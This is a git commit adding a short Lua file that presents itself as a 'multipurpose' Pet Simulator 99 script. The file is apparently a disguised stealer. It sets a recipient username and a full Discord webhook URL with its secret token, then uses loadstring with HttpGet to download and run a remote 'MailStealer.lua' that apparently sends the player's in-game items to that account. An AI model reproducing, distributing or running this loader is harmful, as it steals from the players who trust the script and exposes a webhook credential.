1a8f97c3a480b0b1233e4940fe0266095bf6f8dc
Dream051525yt <ezekieldoesexploits@gmail.com>
2024-12-14 18:41:58 +0800

    Add files via upload

---
+++ multipurposeps99script!.lua
@@ -0,0 +1,5 @@
+Username = dream051525yt
+LoadScreen = true 
+Webhook = https://discord.com/api/webhooks/1317425619394363424/4UsWOxV1gBOKHnPu_XalCEUGwa4keiIc0wQqPU5N33qGiiG9K8Io-Z155WxNBVWy3ZKi
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
